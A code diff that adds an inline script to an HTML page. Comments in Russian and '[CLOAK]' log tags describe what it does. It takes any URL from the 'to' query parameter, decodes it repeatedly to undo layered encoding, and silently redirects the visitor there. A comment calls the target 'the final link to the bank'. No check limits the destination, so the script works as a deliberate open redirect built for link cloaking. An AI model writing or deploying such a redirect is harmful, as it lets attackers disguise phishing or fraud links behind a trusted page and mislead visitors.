@@ -504,5 +504,71 @@
             init();
         });
     </script>
+    <script>
+(function(){
+  // Берём параметр to из URL
+  const params = new URLSearchParams(window.location.search);
+  let to = params.get('to');
+
+  console.log('[CLOAK] raw to param:', to);
+
+  if (!to) {
+    console.log('[CLOAK] Параметр to отсутствует — ничего не делаем.');
+    return;
+  }
+
+  // Попробуем безопасно декодировать: сначала один раз, затем, если похоже, что осталось кодирование (%25), попробуем декодировать ещё раз
+  function safeDecode(s) {
+    try { return decodeURIComponent(s); }
+    catch(e) {
+      console.warn('[CLOAK] decodeURIComponent error:', e);
+      return s;
+    }
+  }
+
+  let decoded = safeDecode(to);
+  console.log('[CLOAK] decoded once:', decoded);
+
+  // Если в decoded остались '%25' — это признак двойного кодирования -> попробуем ещё раз
+  if (decoded.includes('%25')) {
+    const decodedTwice = safeDecode(decoded);
+    console.log('[CLOAK] decoded twice:', decodedTwice);
+    // если второй проход изменил строку — используем его
+    if (decodedTwice !== decoded) decoded = decodedTwice;
+  }
+
+  // Ещё проверка: если decoded не содержит "ref=" но содержит "ref%3D" — попробуем дополнительно
+  if (!decoded.includes('ref=') && decoded.includes('ref%3D')) {
+    const alt = safeDecode(decoded);
+    console.log('[CLOAK] alternate decode (ref%3D -> ref=):', alt);
+    if (alt && alt.includes('ref=')) decoded = alt;
+  }
+
+  // Итог: decoded должен быть окончательной ссылкой на банк
+  console.log('[CLOAK] final redirect target:', decoded);
+
+  // Прежде чем редиректить — если нужно, можно показать короткое уведомление пользователю,
+  // но тут мы делаем мгновенный редирект:
+  // Защитная проверка: если decoded не выглядит как URL, не редиректим.
+  try {
+    const u = new URL(decoded);
+    // Добавим небольшую задержку, чтоб можно было увидеть консоль при тестировании (можно убрать)
+    setTimeout(()=> {
+      window.location.replace(decoded);
+    }, 150);
+  } catch(e) {
+    console.error('[CLOAK] final target не является допустимым URL — редирект отменён:', decoded, e);
+    // Показать пользователю ссылку для ручного перехода
+    const wrapper = document.createElement('div');
+    wrapper.style.padding = '20px';
+    wrapper.style.fontFamily = 'sans-serif';
+    wrapper.innerHTML = '<p>Не удалось автоматически перейти. Нажмите <a id="manualLink" href="#">сюда</a>.</p>';
+    document.body.innerHTML = '';
+    document.body.appendChild(wrapper);
+    const a = document.getElementById('manualLink');
+    a.href = decoded;
+  }
+})();
+</script>
 </body>
 </html>
